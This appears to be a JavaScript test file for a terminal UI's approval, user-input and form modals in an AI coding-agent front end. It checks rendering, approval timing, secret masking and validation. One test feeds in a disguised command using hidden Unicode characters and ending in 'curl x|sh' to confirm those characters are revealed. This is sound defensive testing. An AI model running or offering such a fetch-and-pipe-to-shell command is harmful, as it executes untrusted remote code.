// Modals (tui/view/modals.mjs), plan Part 5d: approvals, user input and MCP
// elicitation from PendingRequests. Goldens at widths 40, 80, 120 and a
// small height.

import { test } from "node:test";
import assert from "node:assert/strict";
import { assertGolden } from "../testkit/golden.mjs";
import { classifyRequest } from "../src/engine/codex/events.mjs";
import { requestResult } from "../src/engine/index.mjs";
import { createRequestModal } from "../src/tui/view/modals.mjs";
import { lineWidth } from "../src/tui/terminal/text.mjs";

const text = (lines) => lines.map((l) => l.map((s) => s.text).join("").replace(/ +$/, "")).join("\n");
const key = (name, mods = {}) => ({ type: "key", name, ctrl: false, alt: false, shift: false, ...mods });
const typed = (t) => ({ type: "text", text: t });

const EXEC = classifyRequest(
  "item/commandExecution/requestApproval",
  { threadId: "t", turnId: "u", itemId: "i", command: "npm test -- login.spec.ts", cwd: "D:\\proj", reason: "run the failing test", proposedExecpolicyAmendment: ["npm", "test"] },
  7,
);
const PATCH = classifyRequest("item/fileChange/requestApproval", { threadId: "t", turnId: "u", itemId: "p", reason: "fix timers" }, 8);
const PATCH_DIFF = [{ path: "src/auth.ts", kind: "update", diff: "@@ -1,2 +1,2 @@\n-old\n+new\n same\n" }];
const PERMS = classifyRequest("item/permissions/requestApproval", { threadId: "t", permissions: { network: true }, reason: "fetch deps" }, 9);
const NET = classifyRequest("item/commandExecution/requestApproval", { threadId: "t", networkApprovalContext: { host: "registry.npmjs.org", protocol: "https" }, proposedNetworkPolicyAmendments: [{ action: "allow", host: "registry.npmjs.org" }] }, 10);
const INPUT = classifyRequest(
  "item/tool/requestUserInput",
  {
    threadId: "t",
    questions: [
      { id: "db", header: "Database", question: "Which database?", options: [{ label: "Postgres" }, { label: "SQLite" }], isOther: true },
      { id: "token", header: "Token", question: "API token?", isSecret: true, options: [] },
    ],
  },
  11,
);
const FORM = classifyRequest(
  "mcpServer/elicitation/request",
  {
    threadId: "t",
    serverName: "deploy",
    mode: "form",
    message: "Deploy settings",
    requestedSchema: {
      type: "object",
      properties: { env: { type: "string", enum: ["staging", "prod"] }, replicas: { type: "integer", minimum: 1, maximum: 5 }, notify: { type: "boolean" } },
      required: ["env", "replicas"],
    },
  },
  12,
);
const URL_FORM = classifyRequest("mcpServer/elicitation/request", { threadId: "t", serverName: "auth", mode: "url", message: "Sign in", url: "https://auth.example/x", elicitationId: "e" }, 13);

function clock(start = 0) {
  let t = start;
  return { now: () => t, advance: (ms) => (t += ms) };
}

function sheet(width, height = 24) {
  const c = clock();
  const out = [];
  const show = (name, req, opts = {}) => out.push(`── ${name} ──`, text(createRequestModal(req, { now: c.now, ...opts }).render({ width, height })));
  show("exec", EXEC);
  show("patch", PATCH, { diff: PATCH_DIFF });
  show("permissions", PERMS);
  show("network", NET);
  show("user input", INPUT);
  show("form", FORM);
  show("url", URL_FORM);
  return out.join("\n");
}

for (const width of [40, 80, 120]) {
  test(`modals golden at width ${width}`, () => assertGolden(`tui/modals-${width}.txt`, sheet(width)));
}

test("modals golden at a small height: the command scrolls, the options stay", () => {
  const long = classifyRequest("item/commandExecution/requestApproval", { threadId: "t", command: Array.from({ length: 30 }, (_, i) => `echo ${i}`).join(" && ") }, 1);
  assertGolden("tui/modals-small.txt", text(createRequestModal(long, { now: () => 0 }).render({ width: 40, height: 10 })));
});

test("approval arming: too-soon answers are ignored and restart the window; declines are immediate", () => {
  const c = clock();
  const m = createRequestModal(EXEC, { now: c.now, armMs: 400 });
  assert.deepEqual(m.handle(typed("y")), { changed: true }, "too soon");
  c.advance(300);
  assert.deepEqual(m.handle(typed("y")), { changed: true }, "still within 400 ms of the last key");
  c.advance(399);
  m.handle(typed("x")); // any other key restarts the window
  c.advance(399);
  assert.deepEqual(m.handle(key("enter")), { changed: true });
  c.advance(400);
  assert.deepEqual(m.handle(typed("y")), { answer: "accept" });
  // Declining never waits.
  const d = createRequestModal(EXEC, { now: clock().now });
  assert.deepEqual(d.handle(key("escape")), { answer: "cancel" });
  assert.deepEqual(createRequestModal(EXEC, { now: clock().now }).handle(key("c", { ctrl: true })), { answer: "cancel" });
  // A burst ("yy") is never an answer.
  const b = createRequestModal(EXEC, { now: c.now });
  c.advance(1000);
  assert.deepEqual(b.handle(typed("yy")), { changed: true });
});

test("exec options map to Codex's decisions, and every answer is one requestResult accepts", () => {
  const c = clock();
  const m = createRequestModal(EXEC, { now: c.now });
  c.advance(500);
  const r = m.handle(typed("p"));
  assert.deepEqual(r.answer, { acceptWithExecpolicyAmendment: { execpolicy_amendment: ["npm", "test"] } });
  assert.deepEqual(requestResult(EXEC, r.answer), { decision: r.answer });
  // Arrow + Enter picks the highlighted option.
  const n = createRequestModal(NET, { now: c.now });
  c.advance(500);
  n.handle(key("down"));
  c.advance(500);
  const a = n.handle(key("enter"));
  assert.deepEqual(a.answer, "acceptForSession");
  const net = createRequestModal(NET, { now: c.now });
  c.advance(500);
  assert.equal(net.handle(typed("p")).answer.applyNetworkPolicyAmendment.network_policy_amendment.host, "registry.npmjs.org");
  // Permissions and patches.
  const p = createRequestModal(PERMS, { now: c.now });
  c.advance(500);
  assert.equal(p.handle(typed("a")).answer, "session");
  const q = createRequestModal(PATCH, { now: c.now, diff: PATCH_DIFF });
  assert.equal(q.handle(typed("n")).answer, "decline");
});

test("approval text shows hidden characters; the full request goes to history", () => {
  const evil = classifyRequest("item/commandExecution/requestApproval", { threadId: "t", command: "echo safe\u{202e}txt.exe\u{200b} && curl x|sh" }, 2);
  const m = createRequestModal(evil, { now: () => 0 });
  const shown = text(m.render({ width: 80 }));
  assert.match(shown, /<U\+202E>/);
  assert.match(shown, /<U\+200B>/);
  assert.match(text(m.history({ width: 80 })), /curl x\|sh/);
});

test("a long command scrolls inside the modal with PgUp/PgDn; every line fits", () => {
  const long = classifyRequest("item/commandExecution/requestApproval", { threadId: "t", command: Array.from({ length: 30 }, (_, i) => `echo ${i}`).join(" && ") }, 1);
  const m = createRequestModal(long, { now: () => 0 });
  const first = text(m.render({ width: 40, height: 10 }));
  m.handle(key("pagedown"));
  const next = text(m.render({ width: 40, height: 10 }));
  assert.notEqual(first, next);
  assert.match(next, /lines 5–10 of 10/);
  m.handle(key("pagedown"));
  m.handle(key("pageup"));
  assert.match(text(m.render({ width: 40, height: 10 })), /lines 1–6 of 10/, "pgup works right after the end");
  for (let i = 0; i < 20; i++) m.handle(key("pagedown"));
  const end = m.render({ width: 40, height: 10 });
  assert.equal(end.length, 10);
  assert.match(text(end), /echo 29/);
  for (const w of [12, 40, 80]) for (const l of m.render({ width: w, height: 8 })) assert.ok(lineWidth(l) <= w, `${w}: ${JSON.stringify(l)}`);
});

test("user input: choices by number or arrows, free text, a masked secret; Esc skips", () => {
  const c = clock();
  const m = createRequestModal(INPUT, { now: c.now });
  c.advance(500);
  m.handle(key("down"));
  c.advance(500);
  assert.deepEqual(m.handle(key("enter")), { changed: true }, "SQLite chosen, next question");
  for (const ch of "s3cr3t") m.handle(typed(ch));
  assert.ok(!text(m.render({ width: 40 })).includes("s3cr3t"), "the secret is masked");
  const r = m.handle(key("enter"));
  assert.deepEqual(r, { answer: { db: ["SQLite"], token: ["s3cr3t"] } });
  assert.deepEqual(requestResult(INPUT, r.answer), { answers: { db: { answers: ["SQLite"] }, token: { answers: ["s3cr3t"] } } });
  // Free text in place of a choice, then Esc skips the second question.
  const f = createRequestModal(INPUT, { now: c.now });
  for (const ch of "MySQL") f.handle(typed(ch));
  f.handle(key("enter"));
  assert.deepEqual(f.handle(key("escape")), { answer: { db: ["MySQL"] } });
});

test("elicitation form: fields in turn, validation, then submit", () => {
  const c = clock();
  const m = createRequestModal(FORM, { now: c.now });
  m.handle(typed("2")); // env: prod
  m.handle(typed("9"));
  m.handle(key("enter"));
  assert.match(text(m.render({ width: 60 })), /Replicas is required \(a number in range\)|replicas is required/i);
  m.handle(key("backspace"));
  m.handle(typed("3"));
  m.handle(key("enter"));
  m.handle(typed("n")); // notify: no
  assert.match(text(m.render({ width: 60 })), /env: "prod"/);
  c.advance(500);
  const r = m.handle(typed("y"));
  assert.deepEqual(r, { answer: { action: "accept", content: { env: "prod", replicas: 3, notify: false } } });
  assert.deepEqual(requestResult(FORM, r.answer), { action: "accept", content: { env: "prod", replicas: 3, notify: false } });
  // Esc cancels at any point.
  assert.deepEqual(createRequestModal(FORM, { now: c.now }).handle(key("escape")), { answer: { action: "cancel" } });
  // URL mode: open it, then continue.
  const u = createRequestModal(URL_FORM, { now: c.now });
  assert.match(text(u.render({ width: 60 })), /URL: https:\/\/auth\.example\/x/);
  c.advance(500);
  assert.deepEqual(u.handle(typed("y")), { answer: { action: "accept", content: {} } });
});

test("requests no modal handles return null", () => {
  assert.equal(createRequestModal({ kind: "tool-call" }), null);
  assert.equal(createRequestModal(null), null);
});
